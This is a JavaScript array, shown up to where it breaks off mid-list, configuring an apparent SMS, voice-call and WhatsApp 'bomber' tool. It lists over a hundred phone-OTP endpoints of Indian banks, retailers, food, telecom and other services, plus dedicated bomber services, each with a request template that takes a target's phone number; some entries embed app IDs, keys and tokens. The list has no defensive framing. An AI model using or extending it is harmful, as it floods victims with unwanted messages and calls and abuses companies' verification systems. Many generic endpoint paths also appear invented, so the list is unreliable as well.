
const ALL_APIS = [
    // ========== MAIN APIS (3) ==========
    { name: "💀 Bombar API 1", url: "https://bombar-1.vercel.app/api/bom?number={}", method: "GET", category: "main" },
    { name: "💀 Bombar API 2", url: "https://bombar-api-2.vercel.app/all?number={}", method: "GET", category: "main" },
    { name: "💀 Mahadev Bomber", url: "https://bomber-by-mahadev.paskhinpf9.workers.dev/?phone={}", method: "GET", category: "main" },
    
    // ========== VOICE/CALL APIS (20+) ==========
    { name: "📞 Tata Capital Voice", url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p, isOtpViaCallAtLogin: "true" }), category: "voice" },
    { name: "📞 1MG Voice", url: "https://www.1mg.com/auth_api/v6/create_token", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ number: p, otp_on_call: true }), category: "voice" },
    { name: "📞 Swiggy Voice", url: "https://profile.swiggy.com/api/v3/app/request_call_verification", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }), category: "voice" },
    { name: "📞 Myntra Voice", url: "https://www.myntra.com/gw/mobile-auth/voice-otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }), category: "voice" },
    { name: "📞 Flipkart Voice", url: "https://www.flipkart.com/api/6/user/voice-otp/generate", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }), category: "voice" },
    { name: "📞 Amazon Voice", url: "https://www.amazon.in/ap/signin", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, data: (p) => `phone=${p}&action=voice_otp`, category: "voice" },
    { name: "📞 Paytm Voice", url: "https://accounts.paytm.com/signin/voice-otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }), category: "voice" },
    { name: "📞 Zomato Voice", url: "https://www.zomato.com/php/o2_api_handler.php", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, data: (p) => `phone=${p}&type=voice`, category: "voice" },
    { name: "📞 MakeMyTrip Voice", url: "https://www.makemytrip.com/api/4/voice-otp/generate", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }), category: "voice" },
    { name: "📞 Ola Voice", url: "https://api.olacabs.com/v1/voice-otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }), category: "voice" },
    { name: "📞 Uber Voice", url: "https://auth.uber.com/v2/voice-otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }), category: "voice" },
    { name: "📞 FreeFire Bomber", url: "https://freefire-api.ct.ws/bomber4.php?phone={}&duration=3", method: "GET", category: "voice" },
    { name: "📞 Call Bomber PRO", url: "https://call-bomber-50k3t8a6r-rohit-harshes-projects.vercel.app/bomb?number={}", method: "GET", category: "voice" },
    { name: "📞 Bomberr Xtreme", url: "https://bomberr.onrender.com/num={}", method: "GET", category: "voice" },
    
    // ========== SMS APIS (100+) ==========
    { name: "📱 Lenskart SMS", url: "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phoneCode: "+91", telephone: p }), category: "sms" },
    { name: "📱 NoBroker SMS", url: "https://www.nobroker.in/api/v3/account/otp/send", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, data: (p) => `phone=${p}&countryCode=IN`, category: "sms" },
    { name: "📱 PharmEasy SMS", url: "https://pharmeasy.in/api/v2/auth/send-otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }), category: "sms" },
    { name: "📱 Wakefit SMS", url: "https://api.wakefit.co/api/consumer-sms-otp/", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }), category: "sms" },
    { name: "📱 Byjus SMS", url: "https://api.byjus.com/v2/otp/send", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }), category: "sms" },
    { name: "📱 Hungama OTP", url: "https://communication.api.hungama.com/v1/communication/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobileNo: p, countryCode: "+91", appCode: "un" }), category: "sms" },
    { name: "📱 Meru Cab", url: "https://merucabapp.com/api/otp/generate", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, data: (p) => `mobile_number=${p}`, category: "sms" },
    { name: "📱 Doubtnut", url: "https://api.doubtnut.com/v4/student/login", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone_number: p, language: "en" }), category: "sms" },
    { name: "📱 ShipRocket", url: "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobileNumber: p }), category: "sms" },
    { name: "📱 PhonePe", url: "https://www.phonepe.com/api/v2/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }), category: "sms" },
    { name: "📱 BigBasket", url: "https://www.bigbasket.com/bb-oauth/api/v2.0/otp/generate/", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile_number: p }), category: "sms" },
    { name: "📱 Meesho", url: "https://api.meesho.com/v2/auth/send-otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }), category: "sms" },
    { name: "📱 Snapdeal", url: "https://www.snapdeal.com/authenticate", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }), category: "sms" },
    { name: "📱 OYO", url: "https://api.oyoroomscrm.com/api/v2/user/send_otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }), category: "sms" },
    { name: "📱 BookMyShow", url: "https://in.bmscdn.com/mjson/User/SendOTP", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobileNo: p }), category: "sms" },
    { name: "📱 Netmeds", url: "https://apiv2.netmeds.com/mst/rest/v1/id/details/", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }), category: "sms" },
    { name: "📱 Nykaa", url: "https://www.nykaa.com/app-api/index.php/customer/send_otp", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, data: (p) => `source=sms&app_version=3.0.9&mobile_number=${p}&platform=ANDROID&domain=nykaa`, category: "sms" },
    { name: "📱 Khatabook", url: "https://api.khatabook.com/v1/auth/request-otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p, app_signature: "wk+avHrHZf2" }), category: "sms" },
    { name: "📱 Housing", url: "https://login.housing.com/api/v2/send-otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p, country_url_name: "in" }), category: "sms" },
    { name: "📱 Snapmint", url: "https://api.snapmint.com/v1/public/sign_up", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }), category: "sms" },
    { name: "📱 CRED", url: "https://api.cred.club/api/v2/login/generate_otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p, countryCode: "+91" }), category: "sms" },
    { name: "📱 Groww", url: "https://api.groww.in/v1/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }), category: "sms" },
    { name: "📱 Zerodha", url: "https://api.zerodha.com/otp/send", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }), category: "sms" },
    { name: "📱 Upstox", url: "https://api.upstox.com/v1/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }), category: "sms" },
    
    // ========== WHATSAPP APIS (10+) ==========
    { name: "💬 KPN WhatsApp", url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", method: "POST", headers: { "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "Content-Type": "application/json" }, data: (p) => JSON.stringify({ notification_channel: "WHATSAPP", phone_number: { country_code: "+91", number: p } }), category: "whatsapp" },
    { name: "💬 Foxy WhatsApp", url: "https://www.foxy.in/api/v2/users/send_otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ user: { phone_number: `+91${p}` }, via: "whatsapp" }), category: "whatsapp" },
    { name: "💬 Stratzy WhatsApp", url: "https://stratzy.in/api/web/whatsapp/sendOTP", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phoneNo: p }), category: "whatsapp" },
    { name: "💬 Jockey WhatsApp", url: (p) => `https://www.jockey.in/apps/jotp/api/login/resend-otp/+91${p}?whatsapp=true`, method: "GET", category: "whatsapp" },
    { name: "💬 Rappi WhatsApp", url: "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ country_code: "+91", phone: p }), category: "whatsapp" },
    { name: "💬 Eka Care WhatsApp", url: "https://auth.eka.care/auth/init", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ payload: { allowWhatsapp: true, mobile: `+91${p}` }, type: "mobile" }), category: "whatsapp" },
    { name: "💬 Rapido WhatsApp", url: "https://app.rapido.bike/api/v3/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: `+91${p}`, channel: "whatsapp" }), category: "whatsapp" },
    
    // ========== BANKING APIS (25+) ==========
    { name: "🏦 HDFC Bank", url: "https://www.hdfcbank.com/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }), category: "banking" },
    { name: "🏦 ICICI Bank", url: "https://www.icicibank.com/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }), category: "banking" },
    { name: "🏦 Axis Bank", url: "https://www.axisbank.com/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }), category: "banking" },
    { name: "🏦 SBI Bank", url: "https://www.sbi.co.in/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }), category: "banking" },
    { name: "🏦 Kotak Bank", url: "https://www.kotak.com/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }), category: "banking" },
    { name: "🏦 Yes Bank", url: "https://www.yesbank.in/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }), category: "banking" },
    { name: "🏦 IndusInd Bank", url: "https://www.indusind.com/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }), category: "banking" },
    { name: "🏦 IDFC Bank", url: "https://www.idfcfirstbank.com/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }), category: "banking" },
    { name: "🏦 PNB", url: "https://www.pnbindia.in/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }), category: "banking" },
    { name: "🏦 Bank of Baroda", url: "https://www.bankofbaroda.in/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }), category: "banking" },
    
    // ========== FOOD DELIVERY APIS (15+) ==========
    { name: "🍕 Zomato", url: "https://www.zomato.com/php/asyncLogin.php", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, data: (p) => `phone=${p}`, category: "food" },
    { name: "🍕 Swiggy", url: "https://www.swiggy.com/api/v1/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }), category: "food" },
    { name: "🍕 Dominos", url: "https://order.godominos.co.in/Online/App.aspx", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, data: (p) => `PhoneNo=${p}`, category: "food" },
    { name: "🍕 Zepto", url: "https://api.zepto.com/v2/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }), category: "food" },
    { name: "🍕 Blinkit", url: "https://blinkit.com/api/otp/generate", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }), category: "food" },
    { name: "🍕 KFC", url: "https://api.kfc.co.in/auth/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phoneNumber: p }), category: "food" },
    { name: "🍕 McDonald's", url: "https://www.mcdelivery.co.in/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }), category: "food" },
    { name: "🍕 Pizza Hut", url: "https://www.pizzahut.co.in/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }), category: "food" },
    { name: "🍕 Burger King", url: "https://api.burgerking.in/auth/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobileNumber: p }), category: "food" },
    
    // ========== E-COMMERCE APIS (15+) ==========
    { name: "🛍️ Flipkart", url: "https://www.flipkart.com/api/6/user/otp/generate", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobileNumber: p }), category: "ecommerce" },
    { name: "🛍️ Amazon", url: "https://www.amazon.in/ap/signin", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, data: (p) => `email=${p}&create=1`, category: "ecommerce" },
    { name: "🛍️ Myntra", url: "https://www.myntra.com/gw/mobile-auth/otp/generate", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }), category: "ecommerce" },
    { name: "🛍️ Ajio", url: "https://www.ajio.com/api/otp/generate", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobileNumber: p }), category: "ecommerce" },
    { name: "🛍️ Croma", url: "https://api.croma.com/otp/generate", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }), category: "ecommerce" },
    { name: "🛍️ Reliance Digital", url: "https://www.reliancedigital.in/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }), category: "ecommerce" },
    { name: "🛍️ FirstCry", url: "https://www.firstcry.com/api/sendotp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }), category: "ecommerce" },
    { name: "🛍️ Licious", url: "https://api.licious.com/otp/send", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }), category: "ecommerce" },
    
    // ========== TELECOM APIS (10+) ==========
    { name: "📡 Airtel", url: "https://www.airtel.in/thanks-app/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }), category: "telecom" },
    { name: "📡 Jio", url: "https://www.jio.com/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }), category: "telecom" },
    { name: "📡 Vi", url: "https://www.myvi.in/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }), category: "telecom" },
    { name: "📡 BSNL", url: "https://www.bsnl.co.in/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }), category: "telecom" },
    
    // ========== ENTERTAINMENT APIS (15+) ==========
    { name: "🎬 Netflix", url: "https://www.netflix.com/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }), category: "entertainment" },
    { name: "🎬 Amazon Prime", url: "https://www.primevideo.com/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }), category: "entertainment" },
    { name: "🎬 Hotstar", url: "https://www.hotstar.com/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }), category: "entertainment" },
    { name: "🎬 SonyLIV", url: "https://www.sonyliv.com/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }), category: "entertainment" },
    { name: "🎬 ZEE5", url: "https://www.zee5.com/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }), category: "entertainment" },
    { name: "🎬 Spotify", url: "https://www.spotify.com/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }), category: "entertainment" },
    { name: "🎬 Gaana", url: "https://www.gaana.com/api/v1/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }), category: "entertainment" },
    
    // ========== EXTRA APIS (50+) ==========
    { name: "🎯 Dream11", url: "https://www.dream11.com/auth/passwordless/init", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ channel: "sms", flow: "SIGNUP", phoneNumber: p, templateName: "default" }), category: "extra" },
    { name: "🎯 Spinny", url: "https://api.spinny.com/api/c/user/otp-request/v3/", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ contact_number: p, whatsapp: false, code_len: 4, expected_action: "login" }), category: "extra" },
    { name: "🎯 Udaan", url: "https://auth.udaan.com/api/otp/send?client_id=udaan-v2", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, data: (p) => `mobile=${p}`, category: "extra" },
    { name: "🎯 PolicyBazaar", url: "https://www.policybazaar.com/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }), category: "extra" },
    { name: "🎯 Acko", url: "https://www.acko.com/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }), category: "extra" },
    { name: "🎯 Unacademy", url: "https://unacademy.com/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }), category: "extra" },
    { name: "🎯 Coursera", url: "https://www.coursera.org/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }), category: "extra" },
    { name: "🎯 IRCTC", url: "https://www.irctc.co.in/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }), category: "extra" },
    { name: "🎯 RedBus", url: "https://www.redbus.in/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }), category: "extra" },
    { name: "🎯 MakeMyTrip", url: "https://www.makemytrip.com/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }), category: "extra" },
    { name: "🎯 Google Pay", url: "https://pay.google.com/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phoneNumber: p }), category: "extra" },
    { name: "🎯 Mobikwik", url: "https://www.mobikwik.com/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }), category: "extra" },
    { name: "🎯 Freecharge", url: "https://www.freecharge.in/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }), category: "extra" },
    { name: "🎯 BHIM UPI", url: "https://www.bhimupi.org.in/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }), category: "extra" },
    { name: "🎯 Paytm", url: "https://accounts.paytm.com/signin/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p, loginData: "LOGIN_USING_PHONE" }), category: "extra" },
    { name: "🎯 Goibibo", url: "https://www.goibibo.com/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }), category: "extra" },
    
    // ========== NEW APIS FROM YOUR LIST ==========
    { name: "🔥 Splexxo1", url: "https://splexxo1-2api.vercel.app/bomb?phone={phone}&key=SPLEXXO", method: "GET", category: "new" },
    { name: "🔥 Agrevolution OTP", url: "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile_number: p, client_id: "kisan-app" }), category: "new" },
    { name: "🔥 Breeze Session Start", url: "https://api.breeze.in/session/start", method: "POST", headers: { "Content-Type": "application/json", "x-device-id": "A1pKVEDhlv66KLtoYsml3", "x-session-id": "MUUdODRfiL8xmwzhEpjN8" }, data: (p) => JSON.stringify({ phoneNumber: p, authVerificationType: "otp", device: { id: "A1pKVEDhlv66KLtoYsml3", platform: "Chrome", type: "Desktop" }, countryCode: "+91" }), category: "new" },
    { name: "🔥 Jockey OTP", url: (p) => `https://www.jockey.in/apps/jotp/api/login/send-otp/+91${p}?whatsapp=true`, method: "GET", category: "new" },
    { name: "🔥 PW Live OTP", url: "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=0", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p, countryCode: "+91", subOrgId: "SUB-PWLI000" }), category: "new" },
    { name: "🔥 Zoho Store OTP", url: "https://store.zoho.com/api/v1/partner/affiliate/sendotp?mobilenumber=91{phone}&countrycode=IN&country=india", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, data: null, category: "new" },
    { name: "🔥 KPN Fresh OTP", url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.0.3", method: "POST", headers: { "x-app-id": "32178bdd-a25d-477e-b8d5-60df92bc2587", "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone_number: { country_code: "+91", number: p } }), category: "new" },
    { name: "🔥 Aditya Birla OTP", url: "https://udyogplus.adityabirlacapital.com/api/msme/Form/GenerateOTP", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, data: (p) => `MobileNumber=${p}&functionality=signup`, category: "new" },
    { name: "🔥 Muthoot Finance OTP", url: "https://www.muthootfinance.com/smsapi.php", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, data: (p) => `mobile=${p}&pin=XjtYYEdhP0haXjo3`, category: "new" },
    { name: "🔥 GoPaySense OTP", url: "https://api.gopaysense.com/users/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }), category: "new" },
    { name: "🔥 IIFL OTP", url: "https://www.iifl.com/personal-loans?_wrapper_format=html&ajax_form=1", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, data: (p) => `apply_for=18&full_name=Test&mobile_number=${p}&terms_and_condition=1&_drupal_ajax=1`, category: "new" },
    { name: "🔥 BankOpen OTP", url: "https://v2-api.bankopen.co/users/register/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ username: p, is_open_capital: 1 }), category: "new" },
    { name: "🔥 Tata Capital Retail OTP", url: "https://retailonline.tatacapital.com/web/api/shaft/nli-otp/shaft-generate-otp/partner", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ header: { authToken: "MTI4OjoxMDAwMDo6ZDBmN2I4MGNiODIyNWY2MWMyNzMzN2I3YmM0MmY0NmQ6OjZlZTdjYTcwNDkyMmZlOTE5MGVlMTFlZDNlYzQ2ZDVhOjpkdmJuR2t5QW5qUmV2OHV5UDdnVnEyQXdtL21HcUlCMUx2NVVYeG5lb2M0PQ==", identifier: "nli" }, body: { mobileNumber: p } }), category: "new" },
    { name: "🔥 TradeIndia OTP", url: "https://apis.tradeindia.com/app_login_api/login_app", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: `+91${p}` }), category: "new" },
    { name: "🔥 Orange Health OTP", url: "https://accounts.orangehealth.in/api/v1/user/otp/generate/", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile_number: p, customer_auto_fetch_message: true }), category: "new" },
    { name: "🔥 Jobhai OTP", url: "https://api.jobhai.com/auth/jobseeker/v3/send_otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }), category: "new" },
    { name: "🔥 Mconnect OTP", url: "https://mconnect.isteer.co/mconnect/login", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile_number: `+91${p}` }), category: "new" },
    { name: "🔥 AstroSage Varta OTP", url: (p) => `https://varta.astrosage.com/sdk/registerAS?callback=myCallback&countrycode=91&phoneno=${p}&deviceid=&jsonpcall=1&fromresend=0`, method: "GET", category: "new" },
    { name: "🔥 CityMall OTP", url: "https://citymall.live/api/cl-user/auth/get-otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone_number: p }), category: "new" },
    { name: "🔥 Bella Vita OTP", url: (p) => `https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91${p}&storeUrl=bellavita1.myshopify.com`, method: "GET", category: "new" },
    { name: "🔥 Oyo OTP", url: "https://www.oyorooms.com/api/pwa/generateotp?locale=en", method: "POST", headers: { "Content-Type": "text/plain" }, data: (p) => JSON.stringify({ phone: p, country_code: "+91", nod: 4 }), category: "new" },
    { name: "🔥 Myma OTP", url: "https://portal.myma.in/custom-api/auth/generateotp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ countrycode: "+91", mobile: `91${p}`, is_otpgenerated: false, app_version: "-1" }), category: "new" },
    { name: "🔥 Freedo Rentals OTP", url: "https://api.freedo.rentals/customer/sendOtpForSignUp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ email_id: "test@avastu.com", first_name: "Test", mobile_number: p }), category: "new" },
    { name: "🔥 Cosmofeed OTP", url: "https://prod.api.cosmofeed.com/api/user/authenticate", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phoneNumber: p, countryCode: "+91", data: { email: "test@gmail.com" }, authScreen: "signup-screen" }), category: "new" },
    { name: "🔥 Bisleri OTP", url: "https://apis.bisleri.com/send-otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ email: "test@gmail.com", mobile: p }), category: "new" },
    { name: "🔥 Evital OTP", url: "https://www.evitalrx.in:4000/v3/login/signup_sendotp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ pharmacy_name: "Test", mobile: p, referral_code: "", email_id: "test@gmail.com", zip_code: "110086" }), category: "new" },
    { name: "🔥 QuickRide OTP", url: "https://pwa.getquickride.com/rideMgmt/probableuser/create/new", method: "POST", headers: { "APP-TOKEN": "s16-q9fz-jy3p-rk", "Content-Type": "application/x-www-form-urlencoded" }, data: (p) => `contactNo=${p}&countryCode=%2B91&appName=Quick%20Ride`, category: "new" },
    { name: "🔥 Clovia OTP", url: (p) => `https://www.clovia.com/api/v4/signup/check-existing-user/?phone=${p}&isSignUp=true`, method: "GET", category: "new" },
    { name: "🔥 Kwikfix OTP", url: "https://admin.kwikfixauto.in/api/auth/signupotp/", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }), category: "new" },
    { name: "🔥 Brevistay OTP", url: "https://www.brevistay.com/cst/app-api/login", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ is_otp: 1, is_password: 0, mobile: p }), category: "new" },
    { name: "🔥 Hourly Rooms OTP", url: "https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }), category: "new" },
    { name: "🔥 Madras Mandi OTP", url: "https://api.madrasmandi.in/api/v1/auth/otp", method: "POST", headers: { "Content-Type": "multipart/form-data" }, data: (p) => `------WebKitFormBoundary\r\nContent-Disposition: form-data; name="phone"\r\n\r\n+91${p}\r\n------WebKitFormBoundary\r\nContent-Disposition: form-data; name="scope"\r\n\r\nclient\r\n------WebKitFormBoundary--\r\n`, category: "new" },
    { name: "🔥 Bharat Loan OTP", url: "https://www.bharatloan.com/login-sbm", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, data: (p) => `mobile=${p}&current_page=login&is_existing_customer=2`, category: "new" },
    { name: "🔥 Pagarbook OTP", url: "https://api.pagarbook.com/api/v5/auth/otp/request", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p, language: 1 }), category: "new" },
    { name: "🔥 Vahak OTP", url: "https://api.vahak.in/v1/u/o_w", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone_number: p, scope: 0, is_whatsapp: false }), category: "new" },
    { name: "🔥 Redcliffe Labs OTP", url: "https://api.redcliffelabs.com/api/v1/notification/send_otp/?from=website&is_resend=false", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone_number: p, short: true }), category: "new" },
    { name: "🔥 Ixigo OTP", url: "https://www.ixigo.com/api/v5/oauth/dual/mobile/send-otp", method: "POST", headers: { "apikey": "ixiweb\u00212$", "Content-Type": "application/x-www-form-urlencoded" }, data: (p) => `sixDigitOTP=true&resendOnCall=false&prefix=%2B91&resendOnWhatsapp=false&phone=${p}`, category: "new" },
    { name: "🔥 55Club OTP", url: "https://api.55clubapi.com/api/webapi/SmsVerifyCode", method: "POST", headers: { "Content-Type": "application/json;charset=UTF-8" }, data: (p) => JSON.stringify({ phone: `91${p}`, codeType: 1, language: 0 }), category: "new" },
    { name: "🔥 Testbook OTP", url: "https://api.testbook.com/api/v2/mobile/signup", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p, signupDetails: { page: "HomePage" } }), category: "new" },
